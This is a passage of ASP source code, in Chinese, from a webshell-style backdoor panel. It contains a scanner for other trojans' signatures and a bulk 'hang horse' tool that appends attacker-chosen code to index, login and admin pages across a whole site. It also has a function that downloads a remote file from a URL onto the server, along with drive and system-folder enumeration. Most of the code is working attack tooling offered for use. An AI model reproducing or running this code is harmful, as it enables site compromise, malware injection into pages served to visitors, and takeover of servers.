RRS "<table width=""100%"" border=""0"" cellpadding=""0"" cellspacing=""0"" style='font-size:12px'><tr><td style=""padding:5px;line-height:170%;clear:both;font-size:12px""><div id=""updateInfo"" style=""background:ffffe1;border:1px solid #89441f;padding:4px;display:none""></div>扫描完毕！一共检查文件夹<font color=""#FF0000"">"&SumFolders&"</font>个，文件<font color=""#FF0000"">"&SumFiles&"</font>个，发现可疑点<font color=""#FF0000"">"&Sun&"</font>个<table width=""100%"" border=""1"" cellpadding=""0"" cellspacing=""8"" bordercolor=""#999999"" style=""font-size:12px;border-collapse:collapse;line-height:130%;clear:both;""><tr>"
If request.Form("radiobutton")="sws" Then
RRS "<td width=""20%"">文件相对路径</td><td width=""20%"">特征码</td><td width=""40%"">描述</td><td width=""20%"">创建/修改时间</td>"
else 
RRS "<td width=""50%"">文件相对路径</td><td width=""25%"">文件创建时间</td><td width=""25%"">修改时间</td>"
end if
RRS "</tr>"
RRS Report
RRS "<br/></table>"
timer2=timer:thetime=cstr(int(((timer2-timer1)*10000 )+0.5)/10)
RRS "<br><font style='font-size:12px'>本页执行共用了"&thetime&"毫秒</font>"
end if
Sub ShowAllFile(Path)
Set F1SO=CreateObject(Sot(0,0))
if not F1SO.FolderExists(path) then exit sub
Set f=F1SO.GetFolder(Path):Set fc2=f.files
For Each myfile in fc2
If CheckExt(F1SO.GetExtensionName(path&"\"&myfile.name)) and (myfile.size<=maxfilesize) Then
Call ScanFile(Path&Temp&"\"&myfile.name, "")
SumFiles=SumFiles + 1
End If
Next
Set fc=f.SubFolders
For Each f1 in fc
ShowAllFile path&"\"&f1.name
SumFolders=SumFolders + 1
Next
Set F1SO=Nothing
End Sub
Sub ScanFile(FilePath, InFile)
Server.ScriptTimeout=999999999
If InFile <> "" Then
Infiles="<font color=red>该文件被<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(InFile)&""" target=_blank>"& InFile&"</a>文件包含执行</font>"
End If
Set FSO1s=CreateObject(Sot(0,0))
on error resume next:set ofile=FSO1s.OpenTextFile(FilePath):filetxt=Lcase(ofile.readall())
If err Then Exit Sub end if
if len(filetxt)>0 then
filetxt=vbcrlf&filetxt
temp="<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(FilePath,server.MapPath("\")&"\","",1,1,1)&"</a><br />"
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""DownFile"")'onclick='return yesok()' class='am' title='下载'>Down</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='删除'>Del</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a>"
If instr( filetxt, Lcase("WScr"&DoMyBest&"ipt.Shell") ) or Instr( filetxt, Lcase("clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8") ) then
Report=Report&"<tr><td>"&temp&"</td><td>WScr"&DoMyBest&"ipt.Shell 或者 clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8</td><td><font color=red>危险组件，一般被ASP木马利用</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End if
If instr( filetxt, Lcase("She"&DoMyBest&"ll.Application") ) or Instr( filetxt, Lcase("clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000") ) then
Report=Report&"<tr><td>"&temp&"</td><td>She"&DoMyBest&"ll.Application 或者 clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000</td><td><font color=red>危险组件，一般被ASP木马利用</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End If
Set regEx=New RegExp
regEx.IgnoreCase=True
regEx.Global=True
regEx.Pattern="\blanguage\s*=\s*[""]?\s*(vbscript|jscript|javascript).encode\b"
If regEx.Test(filetxt) Then
Report=Report&"<tr><td>"&temp&"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>似乎脚本被加密了</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End If
regEx.Pattern="\bev"&"al\b"
If regEx.Test(filetxt) Then
Report=Report&"<tr><td>"&temp&"</td><td>Ev"&"al</td><td>e"&"val()函数可以执行任意ASP代码<br>但是javascript代码中也可以使用，有可能是误报。"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End If
regEx.Pattern="[^.]\bexe"&"cute(global)?\b"
If regEx.Test(filetxt) Then
Report=Report&"<tr><td>"&temp&"</td><td>Exec"&"ute或者Exe"&"cuteGlobal</td><td><font color=red>E"&"xecute()或者Exe"&"cuteGlobal()函数可以执行任意ASP代码</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End If
regEx.Pattern="\.Execu"&"teStatement\b"
If regEx.Test(filetxt) Then
Report=Report&"<tr><td>"&temp&"</td><td>.Exec"&"uteStatement</td><td><font color=red>发现MSScriptControl.ScriptControl的.Execut"&"eStatement函数</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End If
regEx.Pattern="\.(open|create)textfile\b"
If regEx.Test(filetxt) Then
Report=Report&"<tr><td>"&temp&"</td><td>.CreateTextFile|.OpenTextFile</td><td>使用了FSO的CreateTextFile|OpenTextFile读写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End If
regEx.Pattern="\.savet"&"ofile\b"
If regEx.Test(filetxt) Then
Report=Report&"<tr><td>"&temp&"</td><td>.SaveToFile</td><td>使用了stream或jmail的savetofile函数写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End If
regEx.Pattern="\.sa"&"ve(as)?\b"
If regEx.Test(filetxt) Then
Report=Report&"<tr><td>"&temp&"</td><td>.Save</td><td>使用了save或saveas函数写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End If
regEx.Pattern="set\s*.*\s*=\s*server\s"
If regEx.Test(filetxt) Then
Report=Report&"<tr><td>"&temp&"</td><td>Set xxx=Se"&"rver</td><td><font color=red>发现set xxx=ser"&jj&"ver，请仔细检查是否调用.execute"&infiles&"</font></td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End If
regEx.Pattern="server.(ex"&"ecute|transfer)([ \t]*|\()[^""]\)"
If regEx.Test(filetxt) Then
Report=Report&"<tr><td>"&temp&"</td><td>Server.Ex"&"ecute</td><td><font color=red>不能跟踪检查server.e"&"xecute()函数执行的文件，请自行检查</font></td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End If
regEx.Pattern="\.r"&"un\b"
If regEx.Test(filetxt) Then
Report=Report&"<tr><td>"&temp&"</td><td>.Ru"&"n</td><td><font color=red>发现 wscript 的 run 函数"&infiles&"</font></td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End If
regEx.Pattern="\.ex"&"ec\b"
If regEx.Test(filetxt) Then
Report=Report&"<tr><td>"&temp&"</td><td>.Ex"&"ec</td><td><font color=red>发现 wscript 的 exec 函数"&infiles&"</font></td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End If
regEx.Pattern="\.shel"&"lexecute\b"
If regEx.Test(filetxt) Then
Report=Report&"<tr><td>"&temp&"</td><td>.Shelle"&"xecute</td><td><font color=red>发现 application 的 shellexecute 函数"&infiles&"</font></td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End If
regEx.Pattern="\.cre"&"ate\b"
If regEx.Test(filetxt) Then
Report=Report&"<tr><td>"&temp&"</td><td>.Crea"&"te或者.Creat"&"eObject</td><td>发现 Crea"&"te 或 Creat"&"eObject 函数"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
temp="-同上-"
End If
Set regEx=Nothing
set regex=new regexp
regex.ignorecase=true
regex.global=true
regex.pattern="<!--\s*#include\s+(file|virtual)\s*=\s*.*-->"
set matches=regex.execute(filetxt)
for each match in matches
tfile=replace(trim(mid(match.value, instr(match.value, "=") + 1, len(match.value) - instr(match.value, "=") - 1)),"/","\")
if left(tfile, 1)="'" then
tfile=mid(tfile, 2, instr(2, tfile, "'", 1) - 2)
elseif left(tfile, 1)="""" then
tfile=mid(tfile, 2, instr(2, tfile, """", 1) - 2)
else
tfile=replace(tfile, chr(9), " ")
if instr(tfile, " ") <> 0 then 
tfile=left(tfile, instr( tfile, " ") - 1)
else
tfile=left(tfile, instr( tfile, "-") - 1)
end if
end if
if not checkext(fsos.getextensionname(tfile)) then
call scanfile( mid(filepath,1,instrrev(filepath,"\"))&tfile, replace(filepath,server.mappath("\")&"\","",1,1,1) )
sumfiles=sumfiles + 1
end if
next
set matches=nothing
set regex=nothing
set regex=new regexp
regex.ignorecase=true
regex.global=true
regex.pattern="server.(exec"&"ute|transfer)([ \t]*|\()"".*?"""
set matches=regex.execute(filetxt)
for each match in matches
tfile=replace(mid(match.value, instr(match.value, """") + 1, len(match.value) - instr(match.value, """") - 1),"/","\")
if not checkext(fsos.getextensionname(tfile)) then
call scanfile( mid(filepath,1,instrrev(filepath,"\"))&tfile, replace(filepath,server.mappath("\")&"\","",1,1,1) )
sumfiles=sumfiles + 1
end if
next
set matches=nothing
set regex=nothing
set xregex=new regexp
xregex.ignorecase=true
xregex.global=true
xregex.pattern="<scr"&"ipt\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>"
set xmatches=xregex.execute(filetxt)
for each match in xmatches
tmplake2=mid(match.value, 1, instr(match.value, ">"))
srcseek=instr(1, tmplake2, "src", 1)
if srcseek > 0 then
srcseek2=instr(srcseek, tmplake2, "=")
for i=1 to 50
tmp=mid(tmplake2, srcseek2 + i, 1)
if tmp <> " " and tmp <> chr(9) and tmp <> vbcrlf then
exit for
end if
next
if tmp="""" then
tmpname=mid(tmplake2, srcseek2 + i + 1, instr(srcseek2 + i + 1, tmplake2, """") - srcseek2 - i - 1)
else
if instr(srcseek2 + i + 1, tmplake2, " ") > 0 then tmpname=mid(tmplake2, srcseek2 + i, instr(srcseek2 + i + 1, tmplake2, " ") - srcseek2 - i) else tmpname=tmplake2
if instr(tmpname, chr(9)) > 0 then tmpname=mid(tmpname, 1, instr(1, tmpname, chr(9)) - 1)
if instr(tmpname, vbcrlf) > 0 then tmpname=mid(tmpname, 1, instr(1, tmpname, vbcrlf) - 1)
if instr(tmpname, ">") > 0 then tmpname=mid(tmpname, 1, instr(1, tmpname, ">") - 1)
end if
call scanfile( mid(filepath,1,instrrev(filepath,"\"))&tmpname , replace(filepath,server.mappath("\")&"\","",1,1,1))
sumfiles=sumfiles + 1
end if
next
set matches=nothing
set regex=nothing	
Set regEx=New RegExp
regEx.IgnoreCase=True
regEx.Global=True
regEx.Pattern="CreateO"&"bject[ |\t]*\(.*\)"
Set Matches=regEx.Execute(filetxt)
For Each Match in Matches
If Instr(Match.Value, "&") or Instr(Match.Value, "+") or Instr(Match.Value, """")=0 or Instr(Match.Value, "(") <> InStrRev(Match.Value, "(") Then
Report=Report&"<tr><td>"&temp&"</td><td>Creat"&"eObject</td><td>Crea"&"teObject函数使用了变形技术"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun=Sun + 1
exit sub
End If
Next
Set Matches=Nothing
Set regEx=Nothing
end if
set ofile=nothing
set FSO1s=nothing
End Sub
Function CheckExt(FileExt)
If DimFileExt="*" Then CheckExt=True
Ext=Split(DimFileExt,",")
For i=0 To Ubound(Ext)
If Lcase(FileExt)=Ext(i) Then 
CheckExt=True
Exit Function
End If
Next
End Function
Function GetDateModify(filepath)
Set F2SO=CreateObject(Sot(0,0))
Set f=F2SO.GetFile(filepath) 
s=f.DateLastModified 
set f=nothing
set F2SO=nothing
GetDateModify=s
End Function
Function GetDateCreate(filepath)
Set F3SO=CreateObject(Sot(0,0))
Set f=F3SO.GetFile(filepath) 
s=f.DateCreated 
set f=nothing
set F3SO=nothing
GetDateCreate=s
End Function
Function tURLEncode(Str)
temp=Replace(Str, "%", "%25")
temp=Replace(temp, "#", "%23")
temp=Replace(temp, "&", "%26")
tURLEncode=temp
End Function
Sub ShowAllFile2(Path)
Set F4SO=CreateObject(Sot(0,0))
if not F4SO.FolderExists(path) then exit sub
Set f=F4SO.GetFolder(Path)
Set fc2=f.files
For Each myfile in fc2
If CheckExt(F4SO.GetExtensionName(path&"\"&myfile.name)) and (myfile.size<=maxfilesize1) Then
Call IsFind(Path&"\"&myfile.name)
SumFiles=SumFiles + 1
End If
Next
Set fc=f.SubFolders
For Each f1 in fc
ShowAllFile2 path&"\"&f1.name
SumFolders=SumFolders + 1
Next
Set F4SO=Nothing
End Sub
Sub IsFind(thePath)
theDate=GetDateModify(thePath)
on error resume next
theTmp=Mid(theDate, 1, Instr(theDate, " ") - 1)
if err then exit Sub
xDate=Split(request.Form("Search_Date"),";")
If lcase(request.Form("Search_Date"))="all" Then ALLTime=True
For i=0 To Ubound(xDate)
If theTmp=xDate(i) or ALLTime=True Then 
If request("Search_Content") <> "" Then
Set FSO2s=CreateObject(Sot(0,0))
set ofile=FSO2s.OpenTextFile(thePath, 1, false, -2)
filetxt=Lcase(ofile.readall())
If Instr( filetxt, LCase(request.Form("Search_Content"))) > 0 Then
temp="<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(Replace(replace(thePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a>"
temp=temp&" →>  <a href='javascript:FullForm("""&replace(replace(thePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(thePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""DownFile"")'onclick='return yesok()' class='am' title='下载'>Down</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(thePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='删除'>Del</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(thePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(thePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a>"
Report=Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
Sun=Sun + 1
Exit Sub
End If
ofile.close()
Set ofile=Nothing
Set FSO2s=Nothing
Else
temp="<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(thePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(thePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(thePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""DownFile"")'onclick='return yesok()' class='am' title='下载'>Down</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(thePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='删除'>Del</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(thePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(thePath,server.MapPath("/")&"/","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a>"
Report=Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
Sun=Sun + 1
Exit Sub
End If
End If
Next
End Sub
Case "plgm"
Server.ScriptTimeout=1000000 
Response.Buffer=False 
RRS ("<br><b>当前网站绝对路径:")&Server.MapPath("/")&("</b>")
ASP_SELF=Request.ServerVariables("PATH_INFO") 
s=Request("fd") 
if s="" then s=Server.MapPath("/")
ex=Request("ex") 
pth=Request("pth") 
newcnt=Request("newcnt") 
addcode=Request("code")
if addcode="" then addcode="<"
If ex<>"" AND pth<>"" Then 
select Case ex 
Case "edit" 
CALL file_show(pth) 
Case "save" 
CALL file_save(pth) 
End select 
Else 
RRS "<form method='POST'><table border='0' style='font-size:12px;'><tr><td>要挂马的文件夹<br>(绝对路径):</td><td><input type='text' name='fd' value='"&s&"' size=60></td><td>&nbsp;</td></tr><tr><td>要挂马的代码:</td><td><textarea name='code' cols=58 rows='3'>"&addcode&"</textarea></td><td><input name='submit' type='submit' value='开始'></td></tr></table></form>"
End If 
Function IsPattern(patt,str) 
Set regEx=New RegExp:regEx.Pattern=patt:regEx.IgnoreCase=True:retVal=regEx.Test(str):Set regEx=Nothing 
If retVal=True Then
IsPattern=True 
Else
IsPattern=False 
End If 
End Function 
if request.form("submit")<>"" then
If s="" or addcode="" Then
RRS "<font color=red>请输入挂马的路径或代码!</font>"
response.end
else If IsPattern("[^ab]{1}:{1}(\\|\/)",s) Then sch s 
End If
end if 
Sub sch(s) 
oN eRrOr rEsUmE nExT 
Set fs=Server.createObject(Sot(0,0)) 
Set fd=fs.GetFolder(s) 
Set fi=fd.Files 
Set sf=fd.SubFolders 
For Each f in fi 
rtn=f.path 
step_all rtn 
Next 
If sf.Count<>0 Then 
For Each l In sf 
sch l 
Next 
End If 
End Sub 
Sub step_all(agr) 
retVal=IsPattern("(\\|\/)(default|index|conn|admin|bbs|reg|help|upfile|upload|cart|class|login|diy|no|ok|del|config|sql|user|ubb|ftp|asp|top|new|open|name|email|img|images|web|blog|save|data|add|edit|game|about|manager|book|bt|config|mp3|vod|error|copy|move|down|system|logo|QQ|520|newup|myup|play|show|view|ip|err404|send|foot|char|info|list|shop|err|nc|ad|flash|text|admin_upfile|admin_upload|upfile_load|upfile_soft|upfile_photo|upfile_softpic|vip|505)\.(htm|html|asp|php|jsp|aspx|cgi|js)\b",agr) 
If retVal Then 
step1 agr 
step2 agr 
Else 
Exit Sub 
End If 
End Sub 
Sub step1(str1)
RRS "<div style='line-height:20px'>√ "&str1&" _"
RRs "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DownFile"")' class='am' title='下载'>Down</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""EditFile"")' class='am' title='编辑'>edit</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='删除'>Del</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a></div>"
End Sub 
Sub step2(str2) 
Set fs=Server.createObject(Sot(0,0)) 
isExist=fs.FileExists(str2) 
If isExist Then 
Set f=fs.GetFile(str2) 
Set f_addcode=f.OpenAsTextStream(8,-2) 
f_addcode.Write addcode 
f_addcode.Close 
Set f=Nothing 
End If 
Set fs=Nothing 
End Sub 
Err.Clear
Case "Cplgm"
Fpath=Request("fd")
addcode=Request("code")
addcode2=Request("code2")
pcfile=request("pcfile")
checkbox=request("checkbox")
ShowMsg=request("ShowMsg")
FType=request("FType")
M=request("M")
if Ftype="" then Ftype="txt|htm|html|asp|php|jsp|aspx|cgi|cer|asa|cdx"
if Fpath="\" then Fpath=Server.MapPath("\")
if Fpath="." or Fpath="" then Fpath=Server.MapPath("/")
if addcode="" then addcode="<"
if checkbox="" then checkbox=request("checkbox")
if pcfile="" then
pcfileName=Request.ServerVariables("SCRIPT_NAME")
pcfilek=split(pcfileName,"/") 
pcfilen=ubound(pcfilek) 
pcfile=pcfilek(pcfilen) 
end if
RRS ("<BR><b>网站根目录</b>- "&Server.MapPath("/")&"<br>")
RRS ("<b>本程序目录</b>- "&Server.MapPath("."))
RRS "<form method=POST><div style='color:#3399ff'><b>[" 
if M="1" then RRS"批量挂马器-批量挂马"
if M="2" then RRS"批量清马器-清除别人的网马"
if M="3" then RRS"批量替换器-文件替换修改工具"
if M="" then response.end
RRS "]</b></div><table width=100% border=0><tr><td>文件路径：</td>"
RRS "<td><input type=text name=fd value='"&Fpath&"' size=40> 填“\”即网站根目录；“.”为程序所在目录</td></tr>"
if M="1" then RRS "<tr><td>过滤重复：</td><td><input class=c name='checkbox' checked='checked' type=checkbox value=""checked"" "&checkbox&"> 防止一个页面中有多个重复的代码</td></tr>"
RRS "<tr><td>排除文件：</td>"
RRS "<td><input name='pcfile' type=text id='pcfile' value='"&pcfile&"' size=40> 输入不想被修改的文件名，例如：1.asp|2.asp|3.asp</td></tr>"
RRS "<tr><td>文件类型：</td>"
RRS "<td><input name='FType' type=text id='FType' value='"&Ftype&"' size=40> 输入要修改的文件类型[扩展名]，例如：htm|html|asp|php|jsp|aspx|cgi</td></tr><tr><td><font color=#3399ff>"
if M="1" then RRS"要挂的马："
if M="2" then RRS"要清的马："
if M="3" then RRS"查找内容："
RRS"</font></td><td><textarea name=code cols=66 rows=3>"&addcode&"</textarea></td></tr>"
if M="3" then RRS "<tr><td><font color=#3399ff>替 换 为：</font></td><td><textarea name=code2 cols=66 rows=3>"&addcode2&"</textarea></td></tr>"
RRS "<tr><td></td><td> <input name=submit type=submit value=开始执行> --标记解释--[成功：√ ， 排除：× ， 重复：<font color=red>×</font>]</td></tr>"
RRS "</table></form>" 
if request("submit")="开始执行" then 
RRS"<div style='line-height:25px'><b>执行记录：</b><br>"
call InsertAllFiles(Fpath,addcode,pcfile)
RRS"</div>"
end if
Sub InsertAllFiles(Wpath,Wcode,pc)
Server.ScriptTimeout=999999999
if right(Wpath,1)<>"\" then Wpath=Wpath &"\"
Set WFSO=CreateObject(Sot(0,0))
on error resume next 
Set f=WFSO.GetFolder(Wpath)
Set fc2=f.files
For Each myfile in fc2
Set FS1=CreateObject(Sot(0,0))
FType1=split(myfile.name,".") 
FType2=ubound(FType1) 
if Ftype2>0 then
FType3=LCase(FType1(FType2)) 
else
FType3="无"
end if
if Instr(LCase(pc),LCase(myfile.name))=0 and Instr(LCase(FType),FType3)<>0 then
select case M
case "1"
if checkbox<>"checked" then
Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
tfile.writeline Wcode
RRS"√ "&Wpath&myfile.name
tfile.close
else
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
if Instr(tfile1.readall,Wcode)=0 then
Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
tfile.writeline Wcode
RRS"√"&Wpath&myfile.name
tfile1.close
else
RRS"<font color=red>×</font> "&Wpath&myfile.name
tfile1.close
end if
Set tfile1=Nothing
end if
case "2"
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
NewCode=Replace(tfile1.readall,Wcode,"")
Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
objCountFile.Write NewCode
objCountFile.Close
RRS"√"&Wpath&myfile.name
Set objCountFile=Nothing
case "3"
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
NewCode=Replace(tfile1.readall,Wcode,addCode2)
Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
objCountFile.Write NewCode
objCountFile.Close
RRS"√"&Wpath&myfile.name
Set objCountFile=Nothing
case else
RRS"大哥,别乱来.":response.end
end select
else
RRS"× "&Wpath&myfile.name
end if
RRS " →>  <a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""DownFile"")' class='am' title='下载'>Down</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""EditFile"")' class='am' title='编辑'>edit</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='删除'>Del</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a><br>"
Next
Set fsubfolers=f.SubFolders
For Each f1 in fsubfolers
NewPath=Wpath&""&f1.name
InsertAllFiles NewPath,Wcode,pc
Next
set tfile=nothing
Set FSO=Nothing
set tfile=nothing
set tfile2=nothing
Set WFSO=Nothing
End Sub
Sub UpLoad()
        RRS "<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>" 
		RRS ""
		RRS "<form method=post>"
		RRS "<input name=theUrl value='http://"&reqUEsT.SERvErVArIABLEs("REMOTE_HOST")&"/test.mdb' size=80><input type=submit value=' 下载 '><br/>"
		RRS "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
		RRS "<input type=checkbox name=overWrite value=2>存在覆盖"
		RRS "<input type=hidden value=downFromUrl name=theAct>"
		RRS "</form>"
		RRS "<hr/>"
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim Http, theUrl, thePath, stream, fileName, overWrite
		theUrl = Request("theUrl")
		thePath = Request("thePath")
		overWrite = Request("overWrite")
		Set stream = Server.CreateObject("ad"&e&"odb.st"&e&"ream")
		Set Http = Server.CreateObject("MSXML2.XMLHTTP")
		
		If overWrite <> 2 Then
			overWrite = 1
		End If
		
		Http.Open "GET", theUrl, False
		Http.Send()
		If Http.ReadyState <> 4 Then 

		End If
		
		With stream
			.Type = 1
			.Mode = 3
			.Open
			.Write Http.ResponseBody
			.Position = 0
			.SaveToFile thePath, overWrite
			If Err.Number = 3004 Then
				Err.Clear
				fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
				If fileName = "" Then
					fileName = "index.htm.txt"
				End If
				thePath = thePath & "\" & fileName
				.SaveToFile thePath, overWrite
			End If
			.Close
		End With
		chkErr(Err)
		
		Set Http = Nothing
		Set Stream = Nothing

		If isDebugMode = False Then
			On Error Resume Next
		End If	
End sub
Sub ScanDriveForm() '扫描磁盘信息
    Dim FSO,DriveB
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	
Response.Write "<table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
Response.Write "<br><TR><TD colspan=5 align=center>磁盘/系统文件夹信息</TD></TR>"

  For Each DriveB in FSO.Drives
Response.Write "<TR align=middle ><FORM action=?Action=ScanDrive&Drive="&DriveB.DriveLetter&" method=Post>"

response.write "<TD height='26' width=25"&chr(37)&"><B>盘符</B></TD>"	
response.write "<TD width=15"&chr(37)&">"&DriveB.DriveLetter&":</TD> "
response.write "<TD width=20"&chr(37)&"><B>类型</B></TD>"
response.write "<TD width=20"&chr(37)&">"

	  Select Case DriveB.DriveType
		  Case 1: Response.write "可移动"
		  Case 2: Response.write "本地硬盘"
		  Case 3: Response.write "网络磁盘"
		  Case 4: Response.write "CD-ROM"
		  Case 5: Response.write "RAM磁盘"
		  Case else: Response.write "未知类型"
	  End Select
	
Response.Write "</TD><TD><INPUT type=submit value=详细报告></TD></FORM></TR>"
Next
Response.Write "<TR><FORM action=?Action=ScFolder&Folder="&FSO.GetSpecialFolder(0)&" method=Post>"
Response.Write "<TD height='26'align=middle><B>Windows文件夹</B></TD>"
Response.Write "<TD colspan=3>"&FSO.GetSpecialFolder(0)&"</TD>"
Response.Write "<TD align=middle><INPUT type=submit value=详细报告></TD></FORM></TR>"
Response.Write "<TR><FORM action=?Action=ScFolder&Folder="&FSO.GetSpecialFolder(1)&" method=Post>"
Response.Write "<TD height='26' align=middle><B>System32文件夹</B></TD>"
Response.Write "<TD colspan=3>"&FSO.GetSpecialFolder(1)&"</TD>"
Response.Write "<TD height='26' align=middle><INPUT type=submit value=详细报告></TD></FORM></TR>"
Response.Write "<TR> <FORM action=?Action=ScFolder&Folder="&FSO.GetSpecialFolder(2)&" method=Post>"
Response.Write "<TD height='26' align=middle><B>系统临时文件夹</B></TD>"
